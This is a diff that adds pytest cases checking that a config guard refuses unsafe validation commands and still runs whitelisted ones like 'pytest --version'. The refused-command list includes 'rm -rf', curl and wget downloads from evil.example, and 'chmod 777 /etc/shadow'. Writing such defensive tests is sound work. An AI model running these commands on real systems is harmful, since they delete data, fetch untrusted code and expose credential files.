@@ -11,6 +11,7 @@ import json
 import sys
 from pathlib import Path
 
+import pytest
 import yaml
 
 REPO_ROOT = Path(__file__).resolve().parent.parent
@@ -270,6 +271,40 @@ class TestGuardPostcheck:
         result = run_guard_postcheck(project, None, dry_run=True)
         assert result.passed is False
         assert any("refused: unsafe command" in detail for _, _, detail in result.items)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # Metachar-free but NOT a known-safe tool / plain script — a
+            # hand-edited or drift-polluted config must not smuggle arbitrary
+            # executables into subprocess.run(shell=True) just because they
+            # contain no shell-chaining metacharacters.
+            "rm -rf ./vendor",
+            "curl -o /tmp/x https://evil.example/pwn.sh",
+            "wget --quiet https://evil.example/x",
+            "docker run --rm evil/image",
+            "chmod 777 /etc/shadow",
+            "python evil_module_too",
+        ],
+    )
+    def test_unknown_prefix_command_refused(self, tmp_path, command) -> None:
+        """Runtime re-check: first token must be a known-safe prefix."""
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["validation"]["commands"] = {"python": [command]}
+        _write_config(project, config)
+        result = run_guard_postcheck(project, None)
+        assert result.passed is False
+        assert any("refused: unsafe command" in detail for _, _, detail in result.items)
+
+    def test_known_safe_command_still_executes(self, tmp_path) -> None:
+        """Whitelisted tool commands keep running normally."""
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["validation"]["commands"] = {"python": ["pytest --version"]}
+        _write_config(project, config)
+        result = run_guard_postcheck(project, None)
+        assert result.passed is True
 
     def test_unconfigured_module_reported_as_failure(self, tmp_path) -> None:
         """Requesting a module that has no validation.commands entry must FAIL,
